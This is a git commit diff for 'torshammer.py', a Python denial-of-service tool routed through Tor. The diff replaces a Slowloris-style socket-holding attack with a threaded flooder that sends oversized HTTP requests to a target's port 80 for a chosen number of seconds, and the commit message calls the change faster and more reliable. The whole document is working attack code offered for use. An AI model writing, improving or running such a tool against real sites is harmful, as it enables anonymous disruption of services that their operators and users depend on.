8bb0f8188d70822b899c305d8111aba6da11ec57
Ak <79897291+0vm@users.noreply.github.com>
2023-08-02 18:39:21 +1000

    added seconds timeout, added more information in the payload, made it faster and more reliable.

--- torshammer.py
+++ torshammer.py
@@ -1,64 +1,65 @@
 import socket
 import socks
 import random
-import time
+import threading
 import sys
+import time
 
-socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
+socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9150)
 
-headers = [
+USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
 ]
 
-sockets = []
+COUNT = 20
+TIMEOUT = 5
 
+def worker(ip, i, stop_event):
+    while not stop_event.is_set():
+        try:
+            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(TIMEOUT)
+            sock.connect((ip, 80))
 
-def setupSocket(ip):
-    sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(10)
-    sock.connect((ip, 80))
-    sock.send("GET /?{} HTTP/2\r\n".format(random.randint(0, 1500)).encode("utf-8"))
+            headers = f"GET /?{random.randint(0, 1500)} HTTP/1.1\r\n"
+            headers += f"Host: {ip}\r\n"
+            headers += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+            headers += "X-Custom-Header: " + "A" * 5000 + "\r\n"
+            headers += "\r\n"
 
-    for header in headers:
-        sock.send("{}\r\n".format(header).encode("utf-8"))
+            payload = "payload=" + "B" * 2000
 
-    return sock
+            request = headers + payload
 
+            sock.send(request.encode("utf-8"))
+            response = sock.recv(1024)
+            print(f"Thread {i} received: {response}")
+        except Exception as e:
+            print(f"Error in thread {i}: {e}")
+
+def main(ip, time_limit):
+    print(f"Connecting to {ip} with {COUNT} threads for {time_limit} seconds.")
+
+    stop_event = threading.Event()
+    threads = []
+    for i in range(COUNT):
+        thread = threading.Thread(target=worker, args=(ip, i, stop_event))
+        threads.append(thread)
+        thread.start()
+
+    time.sleep(time_limit)
+    stop_event.set()
+
+    print("Time limit reached. Stopping threads.")
+    for thread in threads:
+        thread.join()
 
 if __name__ == "__main__":
-    if len(sys.argv) != 2:
-        print("usage: python3 {} example.com".format(sys.argv[0]))
+    if len(sys.argv) != 3:
+        print(f"Usage: python3 {sys.argv[0]} example.com seconds")
         sys.exit()
 
     ip = sys.argv[1]
-    count = 15
-    print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))
-    print("wait until reach socket {}".format(count))
+    time_limit = int(sys.argv[2])
 
-    for i in range(count):
-        try:
-            print("Socket " + str(i))
-            sock = setupSocket(ip)
-        except socket.error:
-            print("error! socket doesn't connect")
-            if len(sockets) == 0:
-                print("May website do not accept connection")
-                sys.exit()
-            break
-
-        sockets.append(sock)
-
-    send = 0
-
-    while True:
-        print("Connected to {} sockets. Sending headers...".format(send))
-        send += 1
-
-        for sock in list(sockets):
-            try:
-                sock.send(
-                    "X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
-            except socket.error:
-                sockets.remove(sock)
-
-        time.sleep(1)
+    main(ip, time_limit)
